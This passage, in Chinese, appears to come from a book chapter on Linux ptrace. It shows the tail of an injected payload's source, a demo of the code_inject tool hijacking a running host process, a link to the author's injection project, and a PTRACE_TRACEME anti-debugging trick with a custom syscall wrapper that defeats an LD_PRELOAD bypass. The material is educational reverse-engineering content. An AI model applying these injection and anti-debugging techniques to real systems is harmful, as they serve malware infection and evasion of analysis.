    "mov %2, %%rdx\n"
    "mov $1, %%rax\n"
    "syscall" : : "g"(fd), "g"(buf), "g"(len));
  asm("mov %%rax, %0" : "=r"(ret));
  return ret;
}

void Exit(long status)
{
  __asm__ volatile("mov %0, %%rdi\n"
  "mov $60, %%rax\n"
  "syscall" : : "r"(status));
}

_start()
{
  _write(1, "I am the payload who has hijacked your process!\n", 48);
  Exit(0);
}
```

# 简单的例子并不总是那么琐碎

尽管我们的代码注入的源代码看起来并不是那么琐碎，但`code_inject.c`源代码是一个稍微简化的真实内存感染器。我这么说是因为它限制了注入位置无关代码，并且将 payload 可执行文件的文本和数据段加载到同一内存区域中。

如果 payload 程序引用了数据段中的任何变量，它们将无法工作，因此在真实场景中，两个段之间必须有适当的页面对齐。在我们的情况下，payload 程序非常基本，只是向终端的标准输出写入一个字符串。在真实场景中，攻击者通常希望保存原始指令指针和寄存器，然后在 shellcode 运行后恢复执行。在我们的情况下，我们只是让 shellcode 打印一个字符串，然后退出整个程序。

大多数黑客将共享库或可重定位代码注入到进程地址空间。将复杂的可执行文件注入到进程地址空间的想法是一种我以前没有见过的技术，除了我自己的实验和实现。

### 注意

在`elfdemon`源代码中可以找到将完整的动态链接可执行文件（类型为`ET_EXEC`）注入到现有进程中而不覆盖主机程序的示例。这个任务有很多挑战，可以在我的一个实验项目中找到，链接如下：

[`www.bitlackeys.org/projects/elfdemon.tgz`](http://www.bitlackeys.org/projects/elfdemon.tgz)

# 演示 code_inject 工具

正如我们所看到的，我们的程序注入并执行了一个创建可执行内存映射的 shellcode，然后注入和执行了 payload 程序：

1.  运行主机程序（你想要感染的程序）：

```
ryan@elfmaster:~$ ./host &
[1] 29656
I am but a simple program, please don't infect me.

```

1.  运行`code_inject`并告诉它将名为 payload 的程序注入到主机进程中：

```
ryan@elfmaster:~$ ./code_inject `pidof host` payload
I am the payload who has hijacked your process!
[1]+ Done ./host

```

你可能已经注意到`code_inject.c`中似乎没有传统的 shellcode（字节码）。这是因为`uint64_t injection_code(void *)`函数就是我们的 shellcode。由于它已经编译成机器指令，我们只需计算其长度并将其地址传递给`pid_write()`，以便将其注入到进程中。在我看来，这比包含字节码数组的常见方法更加优雅。

# 一个 ptrace 反调试技巧

`ptrace`命令可以用作反调试技术。通常，当黑客不希望他们的程序容易被调试时，他们会包含某些反调试技术。在 Linux 中，一种流行的方法是使用`ptrace`和`PTRACE_TRACEME`请求，以便跟踪自身的进程。

请记住，一个进程一次只能有一个跟踪器，因此如果一个进程已经被跟踪，并且调试器尝试使用`ptrace`附加，它会显示`Operation not permitted`。`PTRACE_TRACEME`也可以用来检查您的程序是否已经被调试。您可以使用下一节中的代码来检查这一点。

## 你的程序正在被跟踪吗？

```
ptrace to find out whether your program is already being traced:
```

```
if (ptrace(PTRACE_TRACEME, 0) < 0) {
printf("This process is being debugged!!!\n");
exit(1);
}
```

前面的代码之所以有效，是因为只有在程序已经被跟踪的情况下才会失败。因此，如果`ptrace`使用`PTRACE_TRACEME`返回一个错误值（小于`0`），你可以确定存在调试器，然后退出程序。

### 注意

如果没有调试器存在，那么`PTRACE_TRACEME`将成功，现在程序正在跟踪自身，任何调试器对程序的跟踪尝试都将失败。因此，这是一个不错的反调试措施。

如第一章所示，*Linux 环境及其工具*，`LD_PRELOAD`环境变量可以用来绕过这种反调试措施，通过欺骗程序加载一个什么都不做只返回`0`的假`ptrace`命令，因此不会对调试器产生任何影响。相反，如果一个程序使用`ptrace`反调试技巧而不使用`libc ptrace`包装器，并且创建自己的包装器，那么`LD_PRELOAD`技巧将不起作用。这是因为程序不依赖任何库来访问`ptrace`。

这是一个使用自己的包装器来使用`ptrace`的替代方法。在本例中，我们将使用`x86_64 ptrace`包装器。

```
#define SYS_PTRACE 101
long my_ptrace(long request, long pid, void *addr, void *data)
{
   long ret;
    __asm__ volatile(
    "mov %0, %%rdi\n"
    "mov %1, %%rsi\n"
    "mov %2, %%rdx\n"
    "mov %3, %%r10\n"
    "mov $SYS_PTRACE, %%rax\n"
    "syscall" : : "g"(request), "g"(pid),
    "g"(addr), "g"(data));
    __asm__ volatile("mov %%rax, %0" : "=r"(ret));
    return ret;
}
```

# 总结

在本章中，您了解了`ptrace`系统调用的重要性以及它如何与病毒和内存感染结合使用。另一方面，它是安全研究人员、逆向工程和高级热修补技术的强大工具。

`ptrace`系统调用将在本书的其余部分定期使用。让本章只作为一个入门。

在下一章中，我们将介绍 Linux ELF 病毒感染的激动人心的世界以及病毒创建背后的工程实践。
